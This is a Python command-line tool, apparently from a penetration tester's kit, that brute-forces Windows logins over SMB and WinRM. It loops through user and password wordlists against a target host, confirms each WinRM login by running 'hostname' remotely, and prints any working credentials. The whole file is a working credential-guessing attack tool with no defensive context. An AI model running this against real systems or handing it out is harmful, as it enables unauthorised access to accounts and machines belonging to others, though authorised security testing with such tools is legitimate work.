#!/bin/env python3

import pypsrp
from pypsrp.client import Client
import smbclient
import sys
import socket
import socket

def brute(ip, user_file, password_file, protocol, verbosity):
  seq = 1
  buffer_len = 0
  users, passwords = read_users_and_passwords(user_file, password_file)
  for user in users:
    user = user.strip()
    if verbosity == "default":  # Putting this `if` here and not in the second `for loop` makes the program go faster
      buffer_len = pretty_print(user, seq_param=seq, file_size=len(users))
    for password in passwords:
      password = password.strip()

      if verbosity == "verbose":
        buffer_len = pretty_print(user, password=password, mode="verbose", seq_param=seq, file_size=len(users))

      try:
        if protocol == "winrm":
          is_auth = brute_winrm(ip, user, password)
        elif protocol == "smb":
          is_auth = brute_smb(ip, user, password)

        if is_auth:
          print(" "*buffer_len, end='\r')
          print(f"[+] {user}:{password}")

      except KeyboardInterrupt:
        sys.exit(0)

    seq += 1

def brute_smb(ip, user, password):
  try:
    smbclient.register_session(ip, username=user, password=password)
    smbclient.reset_connection_cache()  # This will prevent the function from returning previous values
    return True
  except KeyboardInterrupt: # Do not remove this, I know it's dumb but you will break the function
    sys.exit(0)
  except:
    return False

#TODO: winrm over 5986
def brute_winrm(ip, user, password):
  try:
    conn = Client(ip,
                  auth='ntlm',
                  username=u'{}\\{}'.format(ip, user),
                  password=password,
                  ssl=False,
                  cert_validation=False)
    conn.execute_ps('hostname')

    return True
  except KeyboardInterrupt: # Do not remove this, I know it's dumb but you will break the function
    sys.exit(0)
  except pypsrp.exceptions.AuthenticationError:
    return False

def verify_connection(ip, port):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    s.settimeout(None)
  except TimeoutError:
    print(f"\nsmb://{ip}:{port} is unreachable")
    sys.exit(0)

def pretty_print(user, password='', mode="default", seq_param=0, file_size=0):
  if mode == "verbose":
    buffer_len = len(f"User:{seq_param}/{file_size} Trying {user}:{password}")
    print(f"User:{seq_param}/{file_size} Trying {user}:{password}", end='')
    print(" "*buffer_len, end='\r')
  elif mode == "default":
    buffer_len = len(f"User:{seq_param}/{file_size} Trying {user}")
    print(f"User:{seq_param}/{file_size} Trying {user}", end='')
    print(" "*buffer_len, end='\r')

  return buffer_len

def read_users_and_passwords(user_file, password_file):           
  try:                                                            
    with open(user_file, "r") as users_handle:                    
      try:                                                        
        with open(password_file, "r") as passwords_handle:        
          users = users_handle.readlines()                        
          passwords = passwords_handle.readlines()                
      except FileNotFoundError:                                   
        print(f"Couldn't find: {password_file}")                  
        sys.exit(0)                                               
    return users, passwords                                       
                                                                  
  except FileNotFoundError:                                       
    print(f"Couldn't find: {user_file}")                          
    sys.exit(0)                                                   

def print_help():
  print("""
  Usage:  
    protocol:  smb (smb authentication over 445)
               winrm (winrm authentication, runs `hostname` to confirm authentication)

    verbosity: -q (quiet, no output)
               -v (verbose)
               not given (default verbosity)

    winrm-smb_brute.py <protocol> <ip>OR<fqdn> <users_file> <pass_file> <(opt)verbosity>

  Example:
    winrm-smb_brute.py smb comp1.example.local users.txt passwords.txt -v
        """)

  sys.exit(0)

def decide_verbosity():
  verbosity = "default"
  if len(sys.argv) == 6:
    if sys.argv[5] == '-v':
      verbosity = "verbose"
    elif sys.argv[5] == '-q':
      verbosity = "quiet"

  return verbosity

def get_args():
  if len(sys.argv) < 5:
    print_help()
  protocol = sys.argv[1]
  ip = sys.argv[2]
  user_file = sys.argv[3]
  password_file = sys.argv[4]
  port = 445  #TODO: This should not be hardcoded.

  return protocol, ip, user_file, password_file, port

def main():
  protocol, ip, user_file, password_file, port = get_args()
  verify_connection(ip, port)
  verbosity = decide_verbosity()

  if verbosity == "quiet":
    print("This is quiet mode: no output means no hit.")

  ip = socket.gethostbyaddr(ip)[0]
  brute(ip, user_file, password_file, protocol, verbosity)

if __name__ == "__main__":
  main()

